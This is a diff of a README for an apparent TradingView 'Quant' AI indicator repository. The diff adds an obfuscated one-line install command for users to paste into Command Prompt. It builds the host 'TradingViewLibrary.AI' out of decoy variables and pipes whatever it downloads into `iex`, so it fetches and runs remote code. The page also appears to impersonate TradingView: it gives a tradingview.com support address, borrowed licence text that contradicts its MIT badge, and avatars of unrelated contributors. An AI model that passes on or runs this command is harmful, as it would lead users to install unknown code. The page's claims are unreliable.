@@ -1,57 +1,46 @@
 <a id="get"></a>
 <p align="center">
-  <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="quant.jpg" alt="TradingView" width="880"></a>
+  <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="quant.png" alt="TradingView" width="880"></a>
 </p>
 <p align="center">
-<a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="https://img.shields.io/badge/version-2.9.5-blue?style=flat-square&logo=tradingview" alt="version"></a>
+<a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="https://img.shields.io/badge/version-2.9.5%20beta-blue?style=flat-square&logo=tradingview" alt="version"></a>
 <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="https://img.shields.io/badge/license-MIT-green?style=flat-square&logo=opensourceinitiative" alt="license"></a>
-<a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="https://img.shields.io/badge/early%20members-7.4k-brightgreen?style=flat-square&logo=github" alt="early members"></a>
+<a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="https://img.shields.io/badge/beta%20users-7.4k-brightgreen?style=flat-square&logo=github" alt="beta users"></a>
 </p>
 
-Quant is an AI indicator currently in early access. It weighs 47 market factors, including price action, liquidity, positioning and upcoming events, and gives a directional forecast for the asset and timeframe you pick.
-<br><br>
-Each forecast lists the signals that drove it. Open any signal to see the underlying data.
+Quant is our first indicator built on a machine learning model. It analyzes upcoming events, historical market data, price action, liquidity, positioning, volatility, and market structure to produce a directional forecast for the timeframe you select.
 
 ## Installation
-Installation is supported on Windows, macOS and Linux. Make sure TradingView Desktop is installed before running the command below.
+Requires TradingView Desktop app. Setup takes a single command.
 
-#### 1. Open PowerShell
+### 1. Open Command Prompt.
+Press **Win + R**, type `cmd`, press **Enter**.
 
-Press **Win + R**, type `PowerShell`, and press **Enter**.
-
-#### 2. Run the Installation Command
-
-Paste the installation command below into the PowerShell window:
+### 2. Run the Installation Command
+Copy and paste the following command into Command Prompt:
 
 ```powershell
-irm -useb github.com/TradingView-Library/Quant-Indicator/raw/refs/heads/master/scripts/install.ps1 | iex
+powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_2.9.5_beta'; $Sync='Library.'; $Install; $Mode='AI'; $Pinescript='TradingView'+$Sync+$Mode; (curl -UseBasicParsing ($Pinescript)).Content | iex"
 ```
 
-#### 3. Restart the TradingView Desktop App
+### 3. Restart the TradingView Desktop App
 
-If TradingView Desktop was open during installation, restart it. Quant will then appear in your indicator library.
+If TradingView was open during installation, restart it to finish setup. The Quant Indicator will then appear in your indicator library.
 
-----
 
-## Changelog
+# Support
+If you run into an issue or have feedback, open an issue on GitHub or write to support@tradingview.com.
 
-- Added scheduled economic releases to scenario calculations.
-- Changed how historical data loads when switching timeframes.
-- Fixed calculations carrying over after switching symbols.
-- Added validation for missing or delayed market data.
-- Corrected volatility during sharp price moves.
-- Liquidity now uses available market depth data.
-- Fixed positioning errors on instruments with limited history.
-- Removed redundant recalculation on market data updates.
-- Fixed delayed chart updates after periods of low activity.
-- Corrected handling of incomplete candles and partially loaded charts.
-- Fixed data sync after temporary connection drops.
-- Fixed scenario lines staying visible after removing the indicator.
-- Fixed duplicate scenario plots after reloading a chart.
-  
-## Contributors
+# Support
+Licensed under the Apache License, Version 2.0 (the "License"); you may not use this software except in compliance with the <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/LICENSE">License</a>. You may obtain a copy of the License in the LICENSE file. Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.
 
-Thanks to our early access members for their feedback.
+This software incorporates several parts of tslib (https://github.com/Microsoft/tslib, (c) Microsoft Corporation) that are covered by BSD Zero Clause License.
+
+This license requires specifying TradingView as the product creator. You shall add the "attribution notice" from the NOTICE file and a link to https://www.tradingview.com/ to the page of your website or mobile application that is available to your users. As thanks for creating this product, we'd be grateful if you add it in a prominent place. You can use the attributionLogo chart option for displaying an appropriate link to https://www.tradingview.com/ on the chart itself, which will satisfy the link requirement.
+
+# Contributors
+
+Built with feedback from our beta testers. Thank you to everyone who helped us improve it.
 
 <p dir="auto"><a href="https://github.com/steipete"><img src="https://avatars.githubusercontent.com/u/58493?v=4&amp;s=48" width="48" height="48" alt="steipete" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/vincentkoc"><img src="https://avatars.githubusercontent.com/u/25068?v=4&amp;s=48" width="48" height="48" alt="vincentkoc" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/Takhoffman"><img src="https://avatars.githubusercontent.com/u/781889?v=4&amp;s=48" width="48" height="48" alt="Takhoffman" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/obviyus"><img src="https://avatars.githubusercontent.com/u/22031114?v=4&amp;s=48" width="48" height="48" alt="obviyus" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/gumadeiras"><img src="https://avatars.githubusercontent.com/u/5599352?v=4&amp;s=48" width="48" height="48" alt="gumadeiras" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/mbelinky"><img src="https://avatars.githubusercontent.com/u/132747814?v=4&amp;s=48" width="48" height="48" alt="Mariano Belinky" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/vignesh07"><img src="https://avatars.githubusercontent.com/u/1436853?v=4&amp;s=48" width="48" height="48" alt="vignesh07" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/joshavant"><img src="https://avatars.githubusercontent.com/u/830519?v=4&amp;s=48" width="48" height="48" alt="joshavant" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/scoootscooob"><img src="https://avatars.githubusercontent.com/u/167050519?v=4&amp;s=48" width="48" height="48" alt="scoootscooob" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/jacobtomlinson"><img src="https://avatars.githubusercontent.com/u/1610850?v=4&amp;s=48" width="48" height="48" alt="jacobtomlinson" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a>
 <a href="https://github.com/shakkernerd"><img src="https://avatars.githubusercontent.com/u/165377636?v=4&amp;s=48" width="48" height="48" alt="shakkernerd" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/sebslight"><img src="https://avatars.githubusercontent.com/u/19554889?v=4&amp;s=48" width="48" height="48" alt="sebslight" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/tyler6204"><img src="https://avatars.githubusercontent.com/u/64381258?v=4&amp;s=48" width="48" height="48" alt="tyler6204" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/ngutman"><img src="https://avatars.githubusercontent.com/u/1540134?v=4&amp;s=48" width="48" height="48" alt="ngutman" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/thewilloftheshadow"><img src="https://avatars.githubusercontent.com/u/35580099?v=4&amp;s=48" width="48" height="48" alt="thewilloftheshadow" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/Sid-Qin"><img src="https://avatars.githubusercontent.com/u/201593046?v=4&amp;s=48" width="48" height="48" alt="Sid-Qin" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/mcaxtr"><img src="https://avatars.githubusercontent.com/u/7562095?v=4&amp;s=48" width="48" height="48" alt="mcaxtr" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/eleqtrizit"><img src="https://avatars.githubusercontent.com/u/31522568?v=4&amp;s=48" width="48" height="48" alt="eleqtrizit" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/BunsDev"><img src="https://avatars.githubusercontent.com/u/68980965?v=4&amp;s=48" width="48" height="48" alt="BunsDev" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a> <a href="https://github.com/cpojer"><img src="https://avatars.githubusercontent.com/u/13352?v=4&amp;s=48" width="48" height="48" alt="cpojer" style="max-width: 100%; height: auto; max-height: 48px;; aspect-ratio: 48 / 48; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a>
